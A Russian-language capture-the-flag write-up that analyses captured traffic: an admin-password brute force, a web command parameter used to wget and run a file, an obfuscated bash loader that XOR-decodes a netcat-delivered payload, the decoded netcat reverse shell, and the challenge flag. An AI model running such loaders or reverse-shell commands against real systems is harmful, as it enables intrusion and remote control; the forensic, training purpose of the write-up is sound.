1. Фильтруем HTTP пакеты и видим, что у нас происходит брут УЗ для доступа к панели админа. Брут удался, креды админа - ```admin:s3cr3t```.
2. Сайт все еще в разработке, поэтому разработчики оставили сюрприз в виде возомжности выполнять команды через админ панель. Через эту панель подгружается и запускается файл - ```/admin?cmd=wget http://192.168.0.68/1j442dSAw && chmod +x ./1j442dSAw && ./1j442dSAw```.
3. Файл выглядит так:
    ```
    #!/bin/bash
    
    nASDfasd=$(echo "bmMgLWwgLXAgMTIzNCAtcSAxCg==" | base64 -d | bash);koaZXDas=$(echo "$nASDfasd" | base64 -d);xTEAjkds=$(printf "\x13\x37");zirnFSA="";for (( i=0; i<${#koaZXDas}; i++ )); do FsineAS="${koaZXDas:$i:1}";AiejSAF="${xTEAjkds:$((i % ${#xTEAjkds})):1}";Neifunweid=$(printf "%d" "'$FsineAS");KEBAniusad=$(printf "%d" "'$AiejSAF");NAuehAS=$(( $Neifunweid ^ $KEBAniusad ));zirnFSA+=$(printf "\\\x%02x" "$NAuehAS"); done; echo -ne "$zirnFSA" >> asorASde231;chmod +x ./asorASde231;./asorASde231
    ```
    Или, если немного привести в порядок, так:
    ```
    #!/bin/bash
    
    decoded_payload=$(nc -l -p 1234 -q 1);
    payload=$(echo "$decoded_payload" | base64 -d);
    key=$(printf "\x13\x37");
    result="";
    for (( i=0; i<${#payload}; i++ )); do
        char="${payload:$i:1}";
        char_key="${key:$((i % ${#key})):1}";
        char_dec=$(printf "%d" "'$char");
        char_key_dec=$(printf "%d" "'$char_key");
        xored=$(( $char_dec ^ $char_key_dec ));
        result+=$(printf "\\\x%02x" "$xored");
    done;
    
    echo -ne "result" >> rev_shell;
    chmod +x ./rev_shell;
    ./rev_shell
    ```
    То есть скрипт подгружает еще один файл, декодирует его содержимое из base64, затем ксорит с ключом ```\x13\x37```
3. Смотрим, что у нас передавалось по порту 1234 и видим содержимое файла:
    ```
    dlR7WDMVY0B9UncWMT12VHtYMxVUUmdDell0F2FSZVJhRHYXYF92W38ZPRkxPX1UMwYqBT0GJQ89Bz0BKxcnAycDMxp2FzxVelk8VXJEez12VHtYMxVUUmdDell0F3VbclA9GT0VGVJwX3wXMWRmVHBSYEQpF2VFfVRnUWgEfVQjUyBTTEcnTiIHJ1NMQ3tFI0J0X0xAIFVMRHsEf1tMRCNocQNgBnBoJ1YiVCdRbhUZ
    ```
4. Декодируем его из base64, ксорим с ```\x13\x37``` и получаем следующее:
    ```
    echo "pwned!"
    echo "Getting reverse shell..."
    nc 192.168.0.68 4444 -e /bin/bash
    echo "Getting flag..."
    echo "Success: vrnctf{3nc0d3d_p4y104d_thr0ugh_w3b_sh3ll_s0_b4s1c_4a1c4f}"
    ```
5. Отсюда получаем флаг: ```vrnctf{3nc0d3d_p4y104d_thr0ugh_w3b_sh3ll_s0_b4s1c_4a1c4f}```